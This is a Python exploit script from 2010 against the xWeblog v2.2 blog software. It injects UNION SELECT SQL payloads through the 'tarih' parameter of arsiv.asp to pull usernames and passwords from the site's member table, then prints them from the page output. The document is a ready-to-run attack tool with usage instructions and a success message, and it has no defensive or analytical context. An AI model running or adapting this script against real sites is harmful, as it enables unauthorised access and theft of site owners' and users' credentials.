#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
# Title        : xWeblog v2.2 (arsiv.asp tarih) SQL Injection Exploit (.py)
# Proof        : http://img408.imageshack.us/img408/7624/sqlm.jpg
# Script Down. : http://www.aspdunyasi.com/goster.asp?id=19
# Tested       : Windows XP Professional sp3
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Thanks       : http://inj3ct0r.com / http://www.exploit-db.com / http://packetstormsecurity.org / http://shell-storm.org
# Date         : 08/10/2010
# Tesekkur     : r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Lakirdi      : Gecmiyorum Zaman a.k :/
# Lakirdi      : off ulan off / http://www.videokeyfim.net/duruyenin-gugumleri-keklik-gibi-kanadimi-suzmedim-murat-ali-doya-doya-gezmedim-bu-kara-yaziyi-kendim-yazmadim.html
'''
  
import sys, urllib2, re, os, time
 
if len(sys.argv) < 2:
    os.system(['clear','cls'][1])    
    os.system('color 2')
    print "_______________________________________________________________"
    print "                                                               "
    print "   xWeblog v2.2 (arsiv.asp tarih) SQL Inj Exploit (.py)        "
    print "                                                               "
    print "   Coded by ZoRLu                                              "
    print "                                                               "
    print "   Usage:                                                      "
    print "                                                               "
    print "   python exploit.py http://site.com/path/                     "
    print "                                                               "
    print "_______________________________________________________________"
    sys.exit(1)

add = "http://"
add2 = "/"

sitemiz = sys.argv[1]
if sitemiz[-1:] != add2:
    print "\nwhere is  it: " + add2
    print "okk I will add"
    time.sleep(2)
    sitemiz += add2
    print "its ok" + " " + sitemiz
    
if sitemiz[:7]  != add:
    print "\nwhere is it: " + add
    print "okk I will add"
    time.sleep(2)
    sitemiz =  add + sitemiz
    print "its ok" + " " + sitemiz

vulnfile = "arsiv.asp"
ad = "?tarih=0000+union+select+1,AD,3,4,5,6,7,8,9,10,11,12,13+from+uyeler"
url = sitemiz + vulnfile + ad

vulnfile = "arsiv.asp"
sifre = "?tarih=0000+union+select+1,SIFRE,3,4,5,6,7,8,9,10,11,12,13+from+uyeler"
url2 = sitemiz + vulnfile + sifre

print "\nExploiting...\n"
print "wait three sec.!\n"
time.sleep(3)

try:
    veri = urllib2.urlopen(url).read()
    aliver = re.findall(r"<h2>(.*)([0-9a-fA-F])(.*)</h2>", veri)
    if len(aliver) > 0:
        print "AD    :  " + aliver[0][0] + aliver[0][1] + aliver[0][2]
        time.sleep(2)
        
    else:
        print "Exploit failed..."
        sys.exit(1)
        

except urllib2.HTTPError:
    print "Forbidden Sorry! Server has a Security!"
    sys.exit(1)

try:
    veri = urllib2.urlopen(url2).read()
    aliver = re.findall(r"<h2>(.*)([0-9a-fA-F])(.*)</h2>", veri)
    if len(aliver) > 0:
        print "\nSIFRE :  " + aliver[0][0] + aliver[0][1] + aliver[0][2]
                
        print "\nGood Job Bro!"
        time.sleep(1)
    else:
        print "Exploit failed..."
        

except urllib2.HTTPError:
    print "Forbidden Sorry! Server has a Security!"
